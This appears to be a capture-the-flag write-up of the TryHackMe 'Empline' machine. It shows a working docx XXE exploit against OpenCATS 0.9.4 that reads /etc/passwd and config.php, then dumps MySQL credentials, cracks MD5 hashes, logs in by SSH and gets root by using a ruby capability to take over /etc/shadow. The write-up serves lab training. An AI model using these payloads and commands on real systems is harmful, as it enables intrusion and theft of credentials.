# Recon

## Portscanning

command:```sudo nmap -A 10.10.106.137 -T4  -v -p-```

From our scan we have 3 opened ports. Port 22 which runs ssh, port 80 which runs http and port 3306 which runs mysql. We'll be starting our enumeration today from port 80.



# Enumeration (Port 80)

Going to the webpage, you get this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fe4b3709-83ad-4f06-bdfd-225487ada01a)

Lets try to fuzz for directories using ffuf

command:```ffuf -u "http://10.10.106.137/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -e .zip,.sql,.php,.phtml,.bak,.backup```

```
┌──(bl4ck4non㉿bl4ck4non)-[~]
└─$ ffuf -u "http://10.10.106.137/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -e .zip,.sql,.php,.phtml,.bak,.backup 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.106.137/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt
 :: Extensions       : .zip .sql .php .phtml .bak .backup 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

assets                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 231ms]
javascript              [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 394ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 175ms]
:: Progress: [140812/140812] :: Job [1/1] :: 175 req/sec :: Duration: [0:11:55] :: Errors: 0 ::
```
oops, there was nothing here actually. Lets move on to viewing the source page

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/603ec7ef-cc04-4379-a99a-fc154d151679)

We found a subdomain ```job.empline.thm``` in the source page. Lets go ahead and add this to our ```/etc/hosts/``` file.

Navigating to the subdomain page should get you this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2d3d2def-63ff-4e4e-8caf-7377bc4b5c85)

<font color="green">it is an open-source software application that is designed to help recruiters and HR professionals manage the recruitment process. OpenCATS can be used to track job openings, manage resumes, schedule interviews, and manage communication with candidates, among other things.</font>

This webpage is running on ```opencats 0.9.4```. Lets try to look for exploits

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/1ec370f8-8306-4f33-b3d5-a5276d4d5a9d)

So, we can perform a ```'docx ' XML External Entity Injection (XXE)``` attack on this. This is the first time I'll be seeing this though hehe. Since we found the vulnerability, lets go ahead and exploit it😎




# Exploitation (Port 80)

If you recall in the source page we saw this link ```http://job.empline.thm/careers```. Lets navigate to that link

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/88c069eb-7081-4a93-b863-6cb973fb8588)

Checking arounf the webpage, I found an upload page

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2b4ed485-a1d1-4c67-8c89-56d08f93f385)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/662d5c9b-7d43-48e8-935e-168dbaeedbad)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/67e0d0e0-46bd-4f07-ab28-65ceb4fb610b)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d18adc6e-eb16-4d3a-bac8-6541b2f2b7ed)

We are required to upload our resume, this accepts a ```docx``` and an ```odt``` file. Well, this is exactly what we want😂.

We are going to make use of this [blog](https://packetstormsecurity.com/files/164227/OpenCats-0.9.4-XML-Injection.html) to exploit this vulnerability. Lets get started

```
#!/usr/bin/env python
from docx import Document

document=Document()
paragraph=document.add_paragraph('BlackAnon')
document.save('resume.docx')
```
Save this python script into a file lets say ```abeg.py```. What this script does is that it uses the "docx" module to create a new Word document, add a paragraph containing the text "BlackAnon", and save the document as a file named "resume.docx" in the current working directory.

Lets save this and run it

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/empline]
└─$ nano abeg.py
                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/empline]
└─$ python abeg.py 
                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/empline]
└─$ ls 
abeg.py  empline  resume.docx
```
As you can see, it generated a docx file ```resume.docx```. Lets upload this resume

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c42c64e9-ff36-4647-b9c9-9c110c21aa2a)

cool hehe, now this docx file isn't malicious because what it does is print a name. 

A docx file is mostly just zipped up xml files. We need to unzip the ```resume.docx``` file and modify the contents in ```word/document.xm```. Then, save our changes back to resume.docx.

command:```unzip resume.docx```

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/empline]
└─$ unzip resume.docx
Archive:  resume.docx
  inflating: [Content_Types].xml     
  inflating: _rels/.rels             
  inflating: docProps/core.xml       
  inflating: docProps/app.xml        
  inflating: word/document.xml       
  inflating: word/_rels/document.xml.rels  
  inflating: word/styles.xml         
  inflating: word/stylesWithEffects.xml  
  inflating: word/settings.xml       
  inflating: word/webSettings.xml    
  inflating: word/fontTable.xml      
  inflating: word/theme/theme1.xml   
  inflating: customXml/item1.xml     
  inflating: customXml/_rels/item1.xml.rels  
  inflating: customXml/itemProps1.xml  
  inflating: word/numbering.xml      
  inflating: docProps/thumbnail.jpeg 
```
We'll be modifying the ```word/document.xml``` file. We'll be making two modifications. For the fitst one add this payload ```<!DOCTYPE message [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>``` under line one to read the ```etc/passwd``` file

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5307f86b-87b3-429c-9fa2-c4f39f1448ba)

Now, for the second modification, we need to find and change ```BlackAnon``` which was the content of the resume to ```&xxe;```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/49f16dff-aadb-486d-b77d-b94bbb8fb14b)

We are done with the modificatons. To save the modifications to the ```resume.docx``` file, we have to zip it

command:```zip resume.docx word/document.xml```

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/empline]
└─$ zip resume.docx word/document.xml
updating: word/document.xml (deflated 65%)
```
Lets try to upload this again. All things being equal we should be able to view the ```/etc/passwd``` file

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b95114aa-353e-411a-aded-55f0ab335945)

Nice😎. To read the Opencats config.php file to recover plaintext passwords, we will need to base64 encode the contents.

payload:```<!DOCTYPE message [<!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=config.php'>]>```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/eec13427-7e7b-44f3-bba4-21365ddc3d53)

To save the modifications we have to zip the ```resume.docx``` file again

command:```zip resume.docx word/document.xml```

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/empline]
└─$ zip resume.docx word/document.xml
updating: word/document.xml (deflated 64%)
```
Lets try to upload this file again

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/64fe93d7-ad94-459d-aa64-2396a4a3c10a)

We got something in base64. Lets try to decode this using [cyberchef](https://gchq.github.io/CyberChef/).

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7fdd34d0-92c1-4499-9c67-dbbaf40e2b60)

```
/* Database configuration. */
define('DATABASE_USER', 'james');
define('DATABASE_PASS', 'ng6pUFvsGNtw');
define('DATABASE_HOST', 'localhost');
define('DATABASE_NAME', 'opencats');
```
So, we got credentials for the ```mysql database``` which runs on port ```3306```. Lets try to enumerate that port



# Enumeration (Port 3306)

Since we have credentials for the database, we can go ahead and log in

```username:james```        ```password:ng6pUFvsGNtw```

command:```mysql -h 10.10.106.137 -u james -p```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/bbfc3b81-c706-4089-955e-6eb00e3f2bab)

We are logged in. Now, lets go ahead and dump the database

commands:
```
show databases;
use opencats
show tables;
select user_id,user_name,password from user;
```
Running the last command should show you this

```
MariaDB [opencats]> select user_id,user_name,password from user;
+---------+----------------+----------------------------------+
| user_id | user_name      | password                         |
+---------+----------------+----------------------------------+
|       1 | admin          | b67b5ecc5d8902ba59c65596e4c053ec |
|    1250 | cats@rootadmin | cantlogin                        |
|    1251 | george         | 86d0dfda99dbebc424eb4407947356ac |
|    1252 | james          | e53fbdb31890ff3bc129db0e27c473c9 |
+---------+----------------+----------------------------------+
4 rows in set (0.172 sec)
```
Lets save the passwords and usernames in a file. At this point we'll be inviting "John The Ripper" to help us out in cracking the passwords hehe. 

First, we have to determine the password hash. The tool we'll be using for this is ```hash-identifier```. Well, it comes preinstalled with kali linux

command:```hash-identifier```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/bd76ce34-b6a3-4702-a0f5-9fb7ae70812d)

Okay, so it is ```MD5```. 

Using John,

command:```john abeg  --wordlist=/home/bl4ck4non/Documents/rockyou.txt --format=RAW-md5```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b0581d04-7d92-4063-a0fe-9e0f47850118)

One of the passwords got cracked. Well, all thanks to John😁.

If you recall, from our nmap scan we had the ssh service running. We'll be trying the creds we found for the ssh server.

```username:george```       ```password:pretonnevippasempre```

command:```ssh george@10.10.106.137```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/695f0827-ba08-4f5d-b61e-54dd6e672a6b)

Now that we are logged in. Lets go ahead and escalate our privileges.




# Privilege Escalation

Checking for linux capabilities

command:```getcap -r / 2>/dev/null```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/843d655f-f908-4aa8-95de-38671e1434a1)

Now, this looks sus. Why?? This is because the ```ruby``` binary with this capability, can change the owner of the shadow file, change root password, and escalate privileges.

We'll be using a one liner command to change the permission of the ```/etc/shadow``` file to user ```george```.

command:```ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'```

<font color="green">This is a command that uses the Ruby programming language to change the ownership of the /etc/shadow file to user ID (UID) 1000 and group ID (GID) 1000. The chown method from the FileUtils module is used to perform the ownership change.</font>

First, lets get the user ID and group ID for user ```george```

command:```id```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/1c82e81e-20ba-401e-a32a-4e83991a3188)

From the above screenshot we can see that the user ID is ```1002``` and the group ID is ```1002```. With this we can modify the one liner command by making use of george's user ID and group ID.

command:```ruby -e 'require "fileutils"; FileUtils.chown(1002, 1002, "/etc/shadow")```

Before running the command

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fd984e43-5306-4451-a3e4-0e4a5d5147a3)

After running the command

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f42d8d23-5359-4337-b2f1-77f0d01f242c)

What this means is that we now own the ```/etc/shadow``` file. What we'll be doing is changing the root's password. To do this we will generate a new password using openssl

command:```openssl passwd 1234567890```

```
┌──(bl4ck4non㉿bl4ck4non)-[~]
└─$ openssl passwd 1234567890
$1$BZixveX4$uyaYj/0LEg6nsrY4ikdu41
```
We'll be replacing the root's hash password with the newly generated password. You can use any text editor of your choice hehe. I'll be using nano. 

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b5762831-280a-4959-9991-c923911b6870)

Now, that we have successfully changed the root's user password, we can switch user to root user using the password ```1234567890```

command:```su root```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b68d5798-4ae4-4d25-abbe-236fb41726ce)

cool, we are now logged in as the root user😎.

That will be all for today
<br> <br>
[Back To Home](../../index.md)























